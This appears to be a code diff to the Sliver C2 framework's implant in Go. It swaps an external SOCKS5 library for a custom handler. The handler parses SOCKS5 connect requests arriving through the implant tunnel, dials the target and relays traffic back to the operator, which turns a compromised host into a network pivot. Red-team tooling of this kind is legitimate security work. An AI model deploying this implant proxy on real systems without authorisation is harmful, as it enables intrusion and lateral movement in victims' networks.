@@ -23,6 +23,7 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"strconv"
 	"sync"
 	"time"
 
@@ -33,7 +34,6 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/shell"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/things-go/go-socks5"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -49,7 +49,20 @@ var (
 
 	// TunnelID -> Sequence Number -> Data
 	tunnelDataCache = map[uint64]map[uint64]*sliverpb.TunnelData{}
+
+	//socksDataCache = map[uint64]*matrixpb.Socks{}
+	socksDataCache = map[uint64]*SocksDataChan{}
 )
+
+type SocksDataChan struct {
+	Username string
+	Password string
+	Status   bool
+	DataChan chan []byte
+	Sequence uint64
+	TunnelID uint64
+	Conn     *transports.Connection
+}
 
 // GetTunnelHandlers - Returns a map of tunnel handlers
 func GetTunnelHandlers() map[uint32]TunnelHandler {
@@ -360,8 +373,24 @@ var socksTunnels = socksTunnelPool{
 	Sequence:   map[uint64]uint64{},
 }
 
-var socksServer *socks5.Server
-
+func getSocksChan(tunnelID uint64, connection *transports.Connection) (*SocksDataChan, bool) {
+	if dataChan, ok := socksDataCache[tunnelID]; ok {
+		return dataChan, true
+	} else {
+		socksDataCache[tunnelID] = new(SocksDataChan)
+		socksDataCache[tunnelID].DataChan = make(chan []byte, 5)
+		socksDataCache[tunnelID].Username = ""
+		socksDataCache[tunnelID].Password = ""
+		socksDataCache[tunnelID].Conn = connection
+		socksDataCache[tunnelID].Sequence = 0
+		socksDataCache[tunnelID].TunnelID = tunnelID
+		socksDataCache[tunnelID].Status = true
+		// {{if .Config.Debug}}
+		log.Printf("[socks] Server to agent Tunnel (%d) %#v \n", tunnelID, socksDataCache[tunnelID])
+		// {{end}}
+		return socksDataCache[tunnelID], false
+	}
+}
 func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	socksData := &sliverpb.SocksData{}
 	err := proto.Unmarshal(envelope.Data, socksData)
@@ -374,117 +403,243 @@ func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	if socksData.Data == nil {
 		return
 	}
-	// {{if .Config.Debug}}
-	log.Printf("[socks] User to Client to (server to implant) Data Sequence %d, Data Size %d\n", socksData.Sequence, len(socksData.Data))
-	// {{end}}
 
-	if socksData.Username != "" && socksData.Password != "" {
-		cred := socks5.StaticCredentials{
-			socksData.Username: socksData.Password,
-		}
-		auth := socks5.UserPassAuthenticator{Credentials: cred}
-		socksServer = socks5.NewServer(
-			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
-		)
-	} else {
-		socksServer = socks5.NewServer()
+	// data -> chan
+	socksChan, SeqExist := getSocksChan(socksData.TunnelID, connection)
+	socksChan.DataChan <- socksData.Data
+
+	// if not exist
+	if !SeqExist {
+		go socksChan.handleSocks()
 	}
+}
 
-	// {{if .Config.Debug}}
-	log.Printf("[socks] Server: %v", socksServer)
-	// {{end}}
+type Setting struct {
+	method       string
+	tcpConnected bool
+	success      bool
+	tcpConn      net.Conn
+}
 
-	// init tunnel
-	if _, ok := socksTunnels.tunnels[socksData.TunnelID]; !ok {
-		socksTunnels.tunnels[socksData.TunnelID] = make(chan []byte, 10)
-		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
-		err := socksServer.ServeConn(&socks{stream: socksData, conn: connection})
-		if err != nil {
+func (socks *SocksDataChan) handleSocks() {
+	setting := new(Setting)
+	//data, ok := <-dataChan
+	for {
+		if !setting.tcpConnected {
+			data, ok := <-socks.DataChan
+			if !ok {
+				return
+			}
+			// {{if .Config.Debug}}
+			log.Printf("[socks] Server to agent Tunnel (%d) buildConn DataLength %d ,Seq %d\n", socks.TunnelID, len(data), socks.Sequence)
+			// {{end}}
+			// udp or tcp
+			socks.buildConn(setting, data)
+			//log.Printf("setting : %#v", setting)
+			if !setting.tcpConnected {
+				return
+			}
+		} else if setting.tcpConnected { //All done!
+			// {{if .Config.Debug}}
+			log.Printf("[socks] Server to agent Tunnel (%d) proxyS2CTCP ,Seq %d\n", socks.TunnelID, socks.Sequence)
+			// {{end}}
+			go socks.proxyC2STCP(setting.tcpConn)
+			socks.proxyS2CTCP(setting.tcpConn)
+			return
+		} else {
 			return
 		}
-	} else {
-		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
 	}
 }
 
-var _ net.Conn = &socks{}
+func (socks *SocksDataChan) buildConn(setting *Setting, data []byte) {
 
-type socks struct {
-	stream *sliverpb.SocksData
-	conn   *transports.Connection
-	// mux      sync.Mutex
-	Sequence uint64
-}
-
-func (s *socks) Read(b []byte) (n int, err error) {
-	socksTunnels.readMutex.Lock()
-	channel := socksTunnels.tunnels[s.stream.TunnelID]
-	socksTunnels.readMutex.Unlock()
-	data := <-channel
-	return copy(b, data), nil
-}
-
-func (s *socks) Write(b []byte) (n int, err error) {
-	socksTunnels.writeMutex.Lock()
-	data, err := proto.Marshal(&sliverpb.SocksData{
-		TunnelID: s.stream.TunnelID,
-		Data:     b,
-		Sequence: s.Sequence,
-	})
-	if !s.conn.IsOpen {
-		return 0, err
+	failMess := &sliverpb.SocksData{
+		Sequence: socks.Sequence,
+		TunnelID: socks.TunnelID,
+		DataLen:  uint64(len([]byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})),
+		Data:     []byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 	}
-	// {{if .Config.Debug}}
-	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", s.Sequence, len(b), b)
-	// {{end}}
-	s.conn.Send <- &sliverpb.Envelope{
+
+	length := len(data)
+
+	if length <= 2 {
+		//{{if .Config.Debug}}
+		log.Printf("[tunnel] buildConn error length TunnelID %v", socks.Sequence)
+		// {{end}}
+		marshal, _ := proto.Marshal(failMess)
+		socks.Conn.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgSocksData,
+			Data: marshal,
+		}
+		return
+	}
+
+	if data[0] == 0x05 {
+		switch data[1] {
+		case 0x01:
+			socks.tcpConnect(setting, data, length)
+		case 0x02:
+			socks.tcpBind(setting, data, length)
+		case 0x03:
+			socks.udpAssociate(setting, data, length)
+		default:
+			marshal, _ := proto.Marshal(failMess)
+			socks.Conn.Send <- &sliverpb.Envelope{
+				Type: sliverpb.MsgSocksData,
+				Data: marshal,
+			}
+		}
+	}
+}
+
+func Int2Str(num int) string {
+	b := strconv.Itoa(num)
+	return b
+}
+
+// TCPConnect
+func (socks *SocksDataChan) tcpConnect(setting *Setting, data []byte, length int) {
+	var host string
+	var err error
+
+	failMess := &sliverpb.SocksData{
+		Sequence: socks.Sequence,
+		TunnelID: socks.TunnelID,
+		DataLen:  uint64(len([]byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})),
+		Data:     []byte{0x05, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+	}
+
+	succMess := &sliverpb.SocksData{
+		Sequence: socks.Sequence,
+		TunnelID: socks.TunnelID,
+		DataLen:  uint64(len([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})),
+		Data:     []byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+	}
+
+	defer func() {
+		if r := recover(); r != nil {
+			setting.tcpConnected = false
+		}
+	}()
+
+	switch data[3] {
+	case 0x01:
+		host = net.IPv4(data[4], data[5], data[6], data[7]).String()
+	case 0x03:
+		host = string(data[5 : length-2])
+	case 0x04:
+		host = net.IP{data[4], data[5], data[6], data[7],
+			data[8], data[9], data[10], data[11], data[12],
+			data[13], data[14], data[15], data[16], data[17],
+			data[18], data[19]}.String()
+	default:
+		marshal, _ := proto.Marshal(failMess)
+		socks.Conn.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgSocksData,
+			Data: marshal,
+		}
+		setting.tcpConnected = false
+		return
+	}
+
+	port := Int2Str(int(data[length-2])<<8 | int(data[length-1]))
+
+	setting.tcpConn, err = net.DialTimeout("tcp", net.JoinHostPort(host, port), 1*time.Minute)
+
+	if err != nil {
+		marshal, _ := proto.Marshal(failMess)
+		socks.Conn.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgSocksData,
+			Data: marshal,
+		}
+		setting.tcpConnected = false
+		return
+	}
+
+	if !socks.Status { // if admin has already send fin,then close the conn and set setting.tcpConnected -> false
+		setting.tcpConn.Close()
+		//{{if .Config.Debug}}
+		log.Printf("[tunnel] buildConn error Status TunnelID %v", socks.Sequence)
+		// {{end}}
+		marshal, _ := proto.Marshal(failMess)
+		socks.Conn.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgSocksData,
+			Data: marshal,
+		}
+		setting.tcpConnected = false
+		return
+	}
+
+	marshal, _ := proto.Marshal(succMess)
+	socks.Conn.Send <- &sliverpb.Envelope{
 		Type: sliverpb.MsgSocksData,
-		Data: data,
+		Data: marshal,
 	}
-	socksTunnels.writeMutex.Unlock()
-	s.Sequence++
-	return len(b), err
+	setting.tcpConnected = true
 }
 
-func (s *socks) Close() error {
-	close(socksTunnels.tunnels[s.stream.TunnelID])
-	delete(socksTunnels.tunnels, s.stream.TunnelID)
-	data, err := proto.Marshal(&sliverpb.SocksData{
-		TunnelID:  s.stream.TunnelID,
-		CloseConn: true,
-	})
-	if !s.conn.IsOpen {
-		return err
-	}
-	s.conn.Send <- &sliverpb.Envelope{
-		Type: sliverpb.MsgSocksData,
-		Data: data,
-	}
-	return err
+// TCPBind TCPBind方式
+func (socks *SocksDataChan) tcpBind(setting *Setting, data []byte, length int) {
+	setting.tcpConnected = false
 }
 
-func (c *socks) LocalAddr() net.Addr {
-	return nil
+// Based on rfc1928,agent must send message strictly
+func (socks *SocksDataChan) udpAssociate(setting *Setting, data []byte, length int) {
+	setting.tcpConnected = false
 }
 
-func (c *socks) RemoteAddr() net.Addr {
-	return &net.IPAddr{
-		IP:   net.IPv4(127, 0, 0, 1),
-		Zone: "",
+func (socks *SocksDataChan) proxyC2STCP(conn net.Conn) {
+	for {
+		data, ok := <-socks.DataChan
+		if !ok { // no need to send FIN actively
+			return
+		}
+		// {{if .Config.Debug}}
+		log.Printf("[socks] Server to agent Tunnel (%d) ,Seq %d  Data Size %d \n", socks.TunnelID, socks.Sequence, len(data))
+		// {{end}}
+		conn.Write(data)
 	}
 }
 
-// TODO impl
-func (c *socks) SetDeadline(t time.Time) error {
-	return nil
-}
+func (socks *SocksDataChan) proxyS2CTCP(conn net.Conn) {
+	buffer := make([]byte, 20480)
+	for {
+		socks.Sequence++
+		dataMess := &sliverpb.SocksData{
+			TunnelID: socks.TunnelID,
+			Sequence: socks.Sequence,
+		}
+		length, err := conn.Read(buffer)
+		// {{if .Config.Debug}}
+		log.Printf("[socks] agent to Server Tunnel (%d) ,Seq %d Data Size %d \n", socks.TunnelID, socks.Sequence, length)
+		// {{end}}
+		if err != nil {
+			if err == io.EOF {
+				conn.Close() // close conn immediately
+				dataMess.CloseConn = true
+				marshal, _ := proto.Marshal(dataMess)
+				if socks.Conn.IsOpen {
+					socks.Conn.Send <- &sliverpb.Envelope{
+						Type: sliverpb.MsgSocksData,
+						Data: marshal,
+					}
+				}
+				return
+			}
+			// {{if .Config.Debug}}
+			log.Printf("[socks] agent to Server Tunnel (%d) ,error : %s \n", socks.TunnelID, err.Error())
+			// {{end}}
+			socks.Sequence--
+			continue
+		}
+		dataMess.Data = buffer[:length]
+		dataMess.DataLen = uint64(length)
+		marshal, _ := proto.Marshal(dataMess)
+		socks.Conn.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgSocksData,
+			Data: marshal,
+		}
 
-// TODO impl
-func (c *socks) SetReadDeadline(t time.Time) error {
-	return nil
-}
-
-// TODO impl
-func (c *socks) SetWriteDeadline(t time.Time) error {
-	return nil
+	}
 }
